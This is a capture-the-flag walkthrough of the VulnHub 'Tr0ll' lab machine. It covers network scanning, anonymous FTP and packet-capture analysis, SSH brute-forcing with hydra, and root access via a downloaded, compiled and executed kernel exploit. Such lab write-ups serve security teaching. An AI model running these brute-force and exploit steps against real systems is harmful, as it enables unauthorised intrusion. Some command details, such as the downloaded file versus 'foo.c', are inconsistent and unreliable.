# Troll

**Downlod [Troll machine](https://www.vulnhub.com/entry/tr0ll-1,100/)**

Tools :
- netdiscover
- nmap
- wire shark
- hydra

## Find IP address
we need to find the ip of this machine , I will use net discover.
![](https://i.imgur.com/GYcC1Vg.png)

`netdiscover -r 192.168.1.0/24`

let's run nmap now to find out the open ports

![](https://i.imgur.com/kO2Ztfy.png)

`nmap -A 192.168.53.134`

okay there's http and ftp and ssh.
and it tells us that the ftp allows login as anonymous and there's a file called lol.pcap
we will look at those but first let's have a look at the website and i will run Dirb in the background.

![]https://i.imgur.com/m78jfci.png

mmm,okay let's look at robots.txt!

![](https://i.imgur.com/nPfECtX.png)

secret directory !

![](https://i.imgur.com/aKOyWK5.png)

no problem , let's look at dirb result

![](https://i.imgur.com/3OpnwnQ.png)

nothing interesting here..
let's check the ftp

![](https://i.imgur.com/WI3b3mA.png)

the file that nmap told us about ,so let's fire up wire shark!
let's follow tcp stream , right click on any packet -> follow -> tcp stream
![](https://i.imgur.com/RDoovqx.png)

okay so there's secret stuff file .. maybe we should go back and read every packet maybe we could find something
after analyzing this packets I found something interesting!
here it says that we almost found the "sup3rs3cr3tdirlol"

![](https://i.imgur.com/rwyTxDJ.png)

so I read it like super secret dir lol .. so it's a directory right?
let's try the website ..

![](https://i.imgur.com/RI2nyMU.png)

okay another file let's find what is that running file command.


![](https://i.imgur.com/Ksturyh.png)

ELF 32-bit LSB executable?
I will run strings to check if there's embedded strings in it

![](https://i.imgur.com/TM5kKat.png)

oh okay ! , what ? isn't that a memory address?
after some tries , I think i will try it as a directory and it's right !

![](https://i.imgur.com/dUH0ysD.png)

browsing through them , one saying that this folder contains the password
and inside it there's a folder called Pass.txt and here's what it contains

![](https://i.imgur.com/jPDYbC7.png)

and the other is a wordlist , maybe we should use them to connect to ssh

![](https://i.imgur.com/E13hM4V.png)


first thing came to my mind is using overflow as username as the name of the directory was memory address!
and we have the password "Good_job_:)"

but nope .. so I used hydra with the usernames wordlist they provide us and password "Good_job_:)"

![](https://i.imgur.com/WbLiLlk.png)

also nothing  ! ... after spending some time I found out that the folder is literally contains the password and it's "Pass.txt" !
no problem .. let's run hydra again

![](https://i.imgur.com/86smkZR.png)

so let's connect to ssh !

![](https://i.imgur.com/VQ1a9cp.png)

# Privilege escalation

i will run uname to know kernel version

![](https://i.imgur.com/XKac486.png)

`uname -a`

so searching google for this version reveals that there's an exploitation for it [exploit db](https://www.exploit-db.com/exploits/37292)
here I ran wget to download it

![](https://i.imgur.com/rFJ1kEV.png)

`wget https://www.exploit-db.com/exploits/37292`

compiling the file using gcc

`gcc foo.c -o e`

and let's make it executable

`chmod +x e`

running it

`./e`

okay now we are  root

![](https://i.imgur.com/zpNkOFB.png)

and finally here's the flag

![](https://i.imgur.com/X9ic4dX.png)
